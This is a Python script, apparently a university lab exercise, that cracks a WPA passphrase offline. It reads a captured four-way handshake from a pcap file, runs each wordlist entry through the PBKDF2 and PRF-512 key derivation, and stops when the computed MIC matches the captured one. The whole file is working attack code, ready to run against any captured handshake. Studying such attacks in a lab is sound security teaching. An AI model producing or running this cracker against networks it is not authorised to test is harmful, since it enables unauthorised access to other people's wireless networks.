#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Crack a WPA key targeting the MIC using known parameters
"""

__author__      = "Hugo Jeanneret et Pascal Perrenoud"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"


from pbkdf2 import pbkdf2
import hmac
from hashlib import sha1
from binascii import a2b_hex
from scapy.all import rdpcap, Dot11Beacon, Dot11, EAPOL, raw
from tqdm import tqdm
from sys import argv


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """

    blen = 64
    state    = b''

    for i in range(4):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), sha1)
        state += hmacsha1.digest()

    return state[:blen]


# Previous packet
wpa         = rdpcap("wpa_handshake.cap")
A           = "Pairwise key expansion"
ssid        = str.encode(wpa[0][Dot11Beacon].network_stats()['ssid'])
APmac       = a2b_hex(wpa[0][Dot11].addr2.replace(':', ''))
Clientmac   = a2b_hex(wpa[1][Dot11].addr1.replace(':', ''))
ANonce      = wpa[5][EAPOL].load[13:45]
SNonce      = wpa[6][EAPOL].load[13:45]
target_mic  = wpa[8][EAPOL].load[77:93]
B           = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)
data        = raw(wpa[8])[48:]



def check(k):
    k = str.encode(k)
    pmk = pbkdf2(sha1, k, ssid, 4096, 32)
    ptk = customPRF512(pmk, str.encode(A), B)
    guess_mic = hmac.new(ptk[:16], data, sha1)
    return guess_mic.digest()[:16] == target_mic


num_lines = sum(1 for line in open(argv[1]))
print(f"Line count in wordlist : {num_lines}")
with open(argv[1], 'r') as file:
    for key in tqdm(file, total=num_lines):
        if check(key.strip()):
            break
    else:
        raise UserWarning("Key not found in the given wordlist")

print(f"Key found ! It's {key.strip()}")
